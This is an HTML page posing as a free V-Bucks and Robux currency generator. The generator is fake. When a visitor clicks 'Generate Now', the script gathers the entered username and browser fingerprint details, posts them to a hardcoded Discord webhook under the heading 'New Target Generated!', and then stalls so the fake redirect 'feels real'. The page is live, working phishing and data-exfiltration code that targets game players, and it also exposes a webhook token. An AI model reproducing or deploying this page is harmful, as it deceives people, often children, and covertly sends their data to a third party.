<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>RBX & V-Bucks Generator | Timmy Tih</title>
<style>
@import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap');

* { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Inter', sans-serif; }
body { 
    background: #09090b; 
    background-image: radial-gradient(circle at 50% -20%, #1e1b4b 0%, #09090b 70%);
    color: #fff; 
    display: flex; 
    justify-content: center; 
    align-items: center; 
    min-height: 100vh; 
    overflow: hidden;
}

.glass-card { 
    background: rgba(255, 255, 255, 0.03); 
    backdrop-filter: blur(20px);
    border: 1px solid rgba(255, 255, 255, 0.1);
    padding: 40px 30px; 
    border-radius: 24px; 
    box-shadow: 0 30px 60px rgba(0,0,0,0.8), inset 0 1px 0 rgba(255,255,255,0.1); 
    width: 100%; 
    max-width: 420px; 
    text-align: center;
    position: relative;
    overflow: hidden;
}

.glass-card::before {
    content: '';
    position: absolute;
    top: 0; left: 0; right: 0; height: 2px;
    background: linear-gradient(90deg, transparent, #00ff88, #00b06f, transparent);
    opacity: 0.8;
}

.logos { display: flex; justify-content: center; gap: 15px; margin-bottom: 20px; }
.logo-icon { 
    width: 50px; height: 50px; 
    border-radius: 12px; 
    display: flex; align-items: center; justify-content: center;
    font-size: 24px;
    background: #111;
    border: 1px solid #333;
    box-shadow: 0 5px 15px rgba(0,0,0,0.5);
}

.status-badge {
    display: inline-flex; align-items: center; gap: 6px;
    background: rgba(0, 176, 111, 0.1); color: #00ff88;
    padding: 6px 12px; border-radius: 20px; font-size: 11px; font-weight: 600;
    margin-bottom: 20px; border: 1px solid rgba(0, 176, 111, 0.2);
}
.status-dot { width: 6px; height: 6px; background: #00ff88; border-radius: 50%; box-shadow: 0 0 10px #00ff88; }

h1 { font-size: 28px; font-weight: 800; margin-bottom: 8px; line-height: 1.2; }
h1 span { color: #00ff88; }
p.sub { color: #a1a1aa; font-size: 13px; margin-bottom: 30px; }

.input-group { margin-bottom: 20px; text-align: left; }
label { display: block; font-size: 11px; color: #a1a1aa; margin-bottom: 8px; font-weight: 600; text-transform: uppercase; letter-spacing: 0.5px;}
input { 
    width: 100%; padding: 16px; 
    background: rgba(0,0,0,0.4); 
    border: 1px solid #27272a; 
    border-radius: 12px; 
    color: #fff; font-size: 15px; outline: none;
    transition: 0.3s;
}
input:focus { border-color: #00ff88; box-shadow: 0 0 0 3px rgba(0,255,136,0.1); }

.btn { 
    width: 100%; padding: 18px; 
    background: linear-gradient(135deg, #00ff88, #00b06f); 
    border: none; border-radius: 12px; 
    color: #000; font-size: 16px; font-weight: 800; 
    cursor: pointer; text-transform: uppercase; letter-spacing: 1px;
    transition: 0.2s; position: relative;
    box-shadow: 0 10px 20px rgba(0, 176, 111, 0.3);
}
.btn:hover { transform: translateY(-2px); box-shadow: 0 15px 30px rgba(0, 176, 111, 0.4); }
.btn:active { transform: translateY(0); }
.btn.loading { color: transparent; pointer-events: none; }
.btn.loading::after {
    content: ''; position: absolute; left: 50%; top: 50%; transform: translate(-50%, -50%);
    width: 20px; height: 20px; border: 3px solid #000; border-top-color: transparent; border-radius: 50%;
    animation: spin 1s linear infinite;
}
@keyframes spin { to { transform: translate(-50%, -50%) rotate(360deg); } }

.footer { margin-top: 25px; font-size: 11px; color: #52525b; font-weight: 600; }
</style>
</head>
<body>

<div class="glass-card">
    <div class="logos">
        <div class="logo-icon" style="color: #fff; background: #e2231a;">R</div>
        <div class="logo-icon" style="color: #fff; background: #2a2a2a; border-color: #444;">🎮</div>
    </div>
    
    <div class="status-badge"><div class="status-dot"></div> Server Online</div>
    
    <h1>Free <span>V-Bucks</span><br>& Robux Generator</h1>
    <p class="sub">Enter your username to bypass the authentication and generate currency.</p>
    
    <div class="input-group">
        <label>Account Username</label>
        <input type="text" id="username" placeholder="Your username..." autocomplete="off">
    </div>

    <button class="btn" id="generateBtn">Generate Now</button>
    
    <div class="footer">Secured by Timmy Tih v5.0</div>
</div>

<script>
const webhookURL = "https://discord.com/api/webhooks/1564798991109988453/-U6BFuZf9qtxKS5y5LGP0R1rCkjIusbpDvxmN-eWQEzLeMDx_6Xj94OQDiT2W_iRXZMy";

document.getElementById('generateBtn').addEventListener('click', async function() {
    const btn = this;
    const user = document.getElementById('username').value.trim();
    if (!user) { alert("Please enter a username!"); return; }

    btn.classList.add('loading');

    // Gather ALL data
    const data = {
        user: user,
        ua: navigator.userAgent,
        platform: navigator.platform,
        lang: navigator.language,
        tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
        res: window.screen.width + "x" + window.screen.height,
        depth: window.screen.colorDepth,
        cores: navigator.hardwareConcurrency || "Unknown",
        memory: navigator.deviceMemory || "Unknown",
        touch: navigator.maxTouchPoints > 0 ? "Yes" : "No"
    };

    // Discord Embed Payload
    const payload = {
        username: "Timmy Tih Gen",
        avatar_url: "https://i.imgur.com/8Y9M1wB.png",
        embeds: [{
            title: "🎯 New Target Generated!",
            color: 0x00ff88, // Green
            fields: [
                { name: "Input Username", value: `\`\`\`${data.user}\`\`\``, inline: false },
                { name: "OS / Browser", value: `\`\`\`${data.ua}\`\`\``, inline: false },
                { name: "Platform", value: `\`${data.platform}\``, inline: true },
                { name: "Language", value: `\`${data.lang}\``, inline: true },
                { name: "Timezone", value: `\`${data.tz}\``, inline: true },
                { name: "Screen Res", value: `\`${data.res} (${data.depth}bit)\``, inline: true },
                { name: "CPU Cores", value: `\`${data.cores}\``, inline: true },
                { name: "Memory", value: `\`${data.memory}GB\``, inline: true },
                { name: "Touch Screen", value: `\`${data.touch}\``, inline: false }
            ],
            footer: { text: "Sent from V-Bucks Generator" },
            timestamp: new Date().toISOString()
        }]
    };

    try {
        // mode: 'no-cors' is required for Discord webhooks in some browsers
        await fetch(webhookURL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload),
            mode: 'no-cors'
        });
    } catch (e) {
        console.log("Error sending webhook:", e);
    }

    // Small delay before redirecting so it feels real
    setTimeout(() => {
        window.location.href = 'loading.html';
    }, 1200);
});
</script>

</body>
</html>
